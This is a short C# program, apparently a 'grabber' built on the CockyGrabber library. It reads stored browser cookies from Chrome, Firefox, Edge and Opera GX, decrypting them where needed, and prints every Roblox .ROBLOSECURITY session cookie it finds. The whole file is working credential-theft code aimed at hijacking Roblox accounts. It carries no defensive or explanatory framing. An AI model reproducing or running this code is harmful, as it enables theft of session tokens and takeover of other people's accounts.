using CockyGrabber;
using System;
namespace grabber
{
    class Program
    {
        static void Main(string[] args)
        {
            ChromeGrabber cg = new ChromeGrabber(); FirefoxGrabber fg = new FirefoxGrabber(); EdgeGrabber eg = new EdgeGrabber(); OperaGxGrabber og = new OperaGxGrabber();
            if (cg.CookiesExists())
            {
                foreach (var item in cg.GetCookiesByHostname(".roblox.com", cg.GetKey()))
                {
                    if (item.Name == (".ROBLOSECURITY"))
                    {
                        Console.WriteLine(item.Value + "\n");
                    }
                }
            }
            if (fg.CookiesExists())
            {
                foreach (var item in fg.GetCookiesByHostname(".roblox.com"))
                {
                    if (item.Name == (".ROBLOSECURITY"))
                    {
                        Console.WriteLine(item.Value + "\n");
                    }
                }
            }
            if (eg.CookiesExists())
            {
                foreach (var item in eg.GetCookiesByHostname(".roblox.com", eg.GetKey()))
                {
                    if (item.Name == (".ROBLOSECURITY"))
                    {
                        Console.WriteLine(item.Value + "\n");
                    }
                    
                }
            }
            if (og.CookiesExists())
            {
                foreach (var item in og.GetCookiesByHostname(".roblox.com", og.GetKey()))
                {
                    if (item.Name == (".ROBLOSECURITY"))
                    {
                        Console.WriteLine(item.Value + "\n");
                    }
                }
            }
            Console.ReadKey();
        }
    }
}
